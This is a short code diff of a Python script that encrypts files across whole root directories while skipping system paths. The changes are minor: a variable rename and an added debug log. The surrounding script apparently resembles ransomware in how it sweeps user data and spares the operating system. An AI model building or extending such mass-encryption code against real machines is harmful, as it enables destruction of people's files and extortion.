@@ -68,8 +68,7 @@ system_paths = [
 
 # Function to encrypt a file
 def encrypt_file(file_path, exclude_paths):
-    # Check if file is in system paths before encrypting
-    if any(file_path.startswith(path) for path in exclude_paths):
+    if any(file_path.startswith(exclude) for exclude in exclude_paths):
         logging.debug(f"Skipping system path file {file_path}")
         return
     try:
@@ -147,6 +146,7 @@ def main():
     
     # Dynamically add system paths
     exclude_paths.extend([os.path.abspath(path) for path in system_paths])
+    logging.debug(f"Exclude paths: {exclude_paths}")
     
     for root_dir in root_dirs:
         encrypt_files_in_chunks(root_dir, exclude_paths)
